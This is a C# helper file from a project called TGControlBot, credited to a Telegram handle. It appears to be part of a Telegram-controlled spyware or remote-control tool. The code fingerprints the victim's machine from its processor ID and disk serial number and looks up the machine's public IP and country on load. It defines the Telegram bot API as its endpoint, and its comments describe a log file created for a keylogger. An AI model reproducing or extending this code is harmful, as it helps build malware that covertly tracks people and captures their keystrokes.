/////////////////////////////////////////////////////////
///////////////////By Telegram: @madcod//////////////////
/////////////////////////////////////////////////////////

using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows;
using System.Xml;

namespace TGControlBot
{
    class Help
    {
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Global.DesktopPath
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  Global.LocalData
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // Global.System
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Global.AppDate
        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData); // Global.CommonData
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Global.MyDocuments
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // Global.UserProfile

        // Генерим уникальный HWID
        public static string HWID = GetProcessorID() + GetHwid();

        public static string GeoIpURL = "http://ip-api.com/xml";
        public static string ApiUrl = "https://api.telegram.org/bot"; //Global.ApiUrl 
        public static string IP = new WebClient().DownloadString("https://api.ipify.org/"); // Global.IP


        // Временные переменные
        public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt"); //Global.date
        public static string DateLog = DateTime.Now.ToString("MM/dd/yyyy"); //Global.date

        // Создаем файл лога для Кейлоггера
        public static string LoggerLog = LocalData + "\\" + DateLog + "_" + HWID + ".txt"; // Global.LoggerLog

        // Получаем код страны типа: [RU]
        public static string CountryCOde() //Global.CountryCOde()

        {
            XmlDocument xml = new XmlDocument();
            xml.LoadXml(new WebClient().DownloadString(GeoIpURL)); //Получаем IP Geolocation CountryCOde
            string countryCode = "[" + xml.GetElementsByTagName("countryCode")[0].InnerText + "]";
            string CountryCOde = countryCode;
            return CountryCOde;
        }

        // Получаем название страны типа: [Russian]
        public static string Country() //Global.Country()

        {
            XmlDocument xml = new XmlDocument();
            xml.LoadXml(new WebClient().DownloadString(GeoIpURL)); //Получаем IP Geolocation Country
            string countryCode = "[" + xml.GetElementsByTagName("country")[0].InnerText + "]";
            string Country = countryCode;
            return Country;
        }



        // Получаем VolumeSerialNumber
        public static string GetHwid()
        {
            string hwid = "";
            try
            {
                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
                disk.Get();
                string diskLetter = (disk["VolumeSerialNumber"].ToString());
                hwid = diskLetter;
            }
            catch
            { }
            return hwid;
        }

        // Получаем Processor Id
        public static string GetProcessorID()
        {
            string sProcessorID = "";
            string sQuery = "SELECT ProcessorId FROM Win32_Processor";
            ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher(sQuery);
            ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
            foreach (ManagementObject oManagementObject in oCollection)
            {
                sProcessorID = (string)oManagementObject["ProcessorId"];
            }

            return (sProcessorID);
        }
    }
}
